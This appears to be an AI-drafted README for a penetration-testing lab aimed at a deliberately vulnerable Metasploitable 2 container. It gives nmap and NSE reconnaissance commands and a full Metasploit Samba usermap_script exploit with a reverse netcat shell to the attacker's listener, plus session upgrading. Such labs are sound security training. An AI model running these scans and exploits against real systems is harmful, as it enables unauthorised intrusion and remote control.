Here's a structured `README.md` file based on the lab steps you've provided:


# Service-Specific Exploitation Challenge

## Overview
This lab focuses on multi-vector exploitation, a common strategy used by real attackers to ensure persistence and redundancy in enterprise networks. You will simulate adversary behavior by chaining multiple vulnerabilities to gain access to a target system. In this case, you will exploit multiple services on the same Metasploitable 2 host, demonstrating how attackers leverage different vectors to strengthen their position.

## Learning Objectives
Upon completion of this lab, you will be able to:

- Run comprehensive scans and apply service-specific NSE scripts.
- Validate exploit preconditions and choose appropriate payloads.
- Execute a secondary exploitation route to gain access.
- Document key technical evidence to support incident reporting.

## Assumptions and Notes
- **Placeholder values**: Replace `<MSF2_IP>`, `<KALI_IP>`, and `<Your_subnet>` with actual IP addresses and ports.
- **Privileged commands**: Commands that require `sudo` (or root) are indicated. Omit `sudo` if already running as root.
- **Ports and listeners**: Update RPORT, LPORT, and service ports to match your environment (e.g., SSH on port 22, SMB on port 445).
- **Network configuration checks**: Run the following commands if you face unexpected scan results:
  - `ip addr show` (Linux) – Confirm VM/host IPs
  - `ip route` – Check routing/subnet
  - `arp -a` – Review cached ARP entries
- **Metasploitable2 container IP**: Use the following command to get the Metasploitable2 container IP:
  ```bash
  sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2


* **Security and privacy**: Never share real production IP addresses or sensitive data in reports or screenshots.

## Timing

Allow a short delay (30–180 seconds) after starting services or running capture tools for results to populate.

---

## Lab Steps

### Exercise 0: Session Hygiene

If you still have an active session from a previous lab, background it for later use:

```bash
sessions
background
```

### Exercise 1: Full Port Sweep and Focused Verification

1. **Get Metasploitable2 container IP**:

   ```bash
   sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2
   ```

2. **Run a comprehensive port scan**:

   ```bash
   nmap -sV -p- -T3 <MSF2_IP> -oN fullscan.txt
   ```

3. **Run service-specific NSE scripts for discovered services**:

   * **Samba reconnaissance**:

     ```bash
     nmap --script smb-os-discovery,smb-enum-shares -p139,445 <MSF2_IP> -oN nse_samba2.txt
     ```
   * **Distccd check**:

     ```bash
     nmap --script distcc-cve2004-2687 -p3632 <MSF2_IP> -oN nse_distcc.txt
     ```
   * **UnrealIRCd backdoor**:

     ```bash
     nmap --script irc-unrealircd-backdoor -p6667 <MSF2_IP> -oN nse_unreal.txt
     ```
   * **Tomcat manager detection**:

     ```bash
     nmap --script http-title,http-auth,http-headers -p8080 <MSF2_IP> -oN nse_tomcat.txt
     ```

**Note**: Store all outputs (`-oN`) as evidence for the final report.

### Exercise 2: Choose Your Vector and Verify Preconditions

1. **Double-check ports and banners for services**:

   ```bash
   nmap -sV -p139,445 <MSF2_IP>
   ```

2. **Manual banner check** (optional):

   ```bash
   nc -vz <MSF2_IP> 139
   ```

### Exercise 3: Execute the Secondary Exploit (Samba usermap_script example)

1. **Launch and configure the exploit module**:

   ```bash
   msfconsole -q
   use exploit/multi/samba/usermap_script
   set RHOSTS <MSF2_IP>
   set RPORT 139
   set PAYLOAD cmd/unix/reverse_netcat
   set LHOST <Kali IP>
   set LPORT 5555
   run
   background
   ```

2. **Confirm with 'y'** and verify the new session:

   ```bash
   sessions
   sessions -u 1
   sessions -i <NEW_ID>
   getuid
   sysinfo
   ```

**Note**: A second exploitation route strengthens your compromise and validates your decision-making.

### Exercise 4: Document Key Evidence

1. **Capture a quick set of artifacts** for your report:

   ```bash
   shell
   date
   ps aux | head
   netstat -plant 2>/dev/null | head || ss -plnt | head
   ```

---

## Challenge Exercise: Explore Another Exploitation Path

1. **Objective**: Try to identify and exploit a different service (e.g., distccd, UnrealIRCd, or Tomcat Manager).
2. **Capture Evidence**: Document the exploit attempt and the outcomes.
3. **Record your steps and challenges**: Take note of what worked, what didn’t, and any obstacles encountered.

---

## Conclusion

By completing this lab, you have:

* Run a full port sweep to identify services and vulnerabilities.
* Applied service-specific NSE scripts to automate reconnaissance.
* Executed a secondary exploitation vector to gain further access.
* Captured and documented technical evidence to support incident reporting.

This approach mirrors real-world adversary tactics where multiple weaknesses are exploited in tandem to ensure persistence and create redundancy in a compromised environment.

---

## Additional Resources

* [Metasploit Documentation](https://metasploit.help.rapid7.com/docs)
* [Nmap Scripting Engine Documentation](https://nmap.org/nsedoc/)
* [Metasploitable 2 Documentation](https://metasploit.help.rapid7.com/docs/metasploitable-2)
